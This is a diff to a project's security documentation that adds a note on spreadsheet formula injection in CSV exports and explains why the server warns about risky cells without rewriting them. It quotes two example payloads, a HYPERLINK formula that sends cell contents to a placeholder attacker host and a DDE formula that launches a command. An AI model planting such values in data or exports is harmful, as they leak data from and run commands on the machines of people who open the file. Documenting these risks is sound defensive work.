@@ -206,6 +206,22 @@ deterministic.
 3. **Authorization**: Does not implement user-level access controls
 4. **Encryption**: Does not enforce connection encryption (configurable separately)
 5. **Audit Logging**: Provides basic logging but not comprehensive audit trails
+6. **Spreadsheet Formula Injection in CSV Exports**: `export_table_csv` returns database values
+   verbatim. A value beginning with `=`, `+`, `-` or `@` — including one that only does so once
+   a leading tab, carriage return or line feed is stripped, which is how such a payload evades a
+   naive first-character filter — is evaluated
+   as a **formula** rather than data when the CSV is opened in Excel, LibreOffice Calc or Google
+   Sheets, so a stored `=HYPERLINK("http://attacker/?"&A1)` or `=cmd|'/c calc'!A1` executes in
+   the recipient's spreadsheet. The value never has to be malicious in the database, only
+   rendered, which puts every column a user can influence in scope. The server does **not**
+   neutralise these values, deliberately: silently rewriting `-1` as `'-1` would corrupt the
+   export for every consumer that is not a spreadsheet - a pipeline, another database,
+   `pandas.read_csv` - where the mitigation would be the bug. Instead the export **warns**: when
+   risky cells are present the response carries a second text block naming the count, and the
+   CSV bytes are left untouched. Treat a warned export as unsafe to open directly in a
+   spreadsheet; import it as text, or neutralise the flagged cells at the point of use. Ordinary
+   negative numbers are exempt from the check, since no string is both a numeric literal and a
+   formula. Decided in #1245.
 
 ## 🔐 GitHub Actions & CI/CD Security
 
